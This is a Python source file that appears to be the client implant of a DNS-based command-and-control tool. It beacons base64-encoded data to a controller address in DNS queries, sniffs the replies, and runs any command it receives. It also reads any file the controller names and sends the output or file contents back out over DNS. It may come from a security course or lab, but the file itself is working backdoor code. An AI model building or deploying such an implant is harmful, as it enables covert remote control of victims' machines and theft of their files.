
from dns_c2_modules import *

cond = 0

def read_file(file_name):
    with open(file_name, "rb") as f:
        return f.read()
        

def send_beacon(addr,data):
    while cond == 0:
        # pkt_no_data = IP(dst=addr)/ICMP(type="echo-request")
        # pkt_send(pkt_no_data,data,0)
        #pkt_no_data = IP(dst=addr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=base64.b64encode(data)))
        send_qery(addr,base64.b64encode(data),0)
        print("send beacon")
        time.sleep(5)
    

def parse_packet(packet):
    
    if  Raw in packet:
        global cond
        
        if packet.haslayer(DNS): 
            print("client in parse")
            cond = 1
            #get_an = packet[DNS].qd.rdata
            get_an =  packet[1][DNSRR].rdata
            print("answer:")
            print(get_an)
            #prefix_packet = check_prefix(get_an)     
            prefix_packet = check_prefix(base64.b64decode(get_an))
            print("prefix:")
            print(prefix_packet)
            data_recieved = extract_data(get_an,prefix_packet)
            print("data receieved:")
            print(data_recieved)
            #pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
            
            if prefix_packet == RUN or prefix_packet == FILE:
                print("recieved response!")
                txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
                if prefix_packet == RUN:
                    output = RunCommand(txt_recieved)
                    bin_output = bytes(output.encode())
                    send_qery(SERVER_ADR,base64.b64encode(BEGIN_OUTPUT)+data_recieved,0)
                    send_qery(SERVER_ADR,base64.b64encode(bin_output),1)
                    # pkt_send(pkt_no_data,BEGIN_OUTPUT + data_recieved,0)
                    # pkt_send(pkt_no_data,bin_output,1)
                else:
                    output = read_file(txt_recieved)   # read in binary mode
                    send_qery(SERVER_ADR,base64.b64encode(BEGIN_FILE)+data_recieved,0)
                    send_qery(SERVER_ADR,base64.b64encode(output),1)
                    pkt_send(SERVER_ADR,output,1)
                send_qery(SERVER_ADR,base64.b64encode(EF),0)
                    
            cond = 0
            print("cond changed to " + str(cond))
        

def client_listen():
    print("client start listening")
    sniff_pkt(pfilter="host " + SERVER_ADR,handler=parse_packet)
    

if __name__=="__main__":
    signal.signal(signal.SIGINT, signal_handler)
    beacon_thread = threading.Thread(target=send_beacon, args=(SERVER_ADR,BEACON))
    beacon_thread.start()
    client_listen()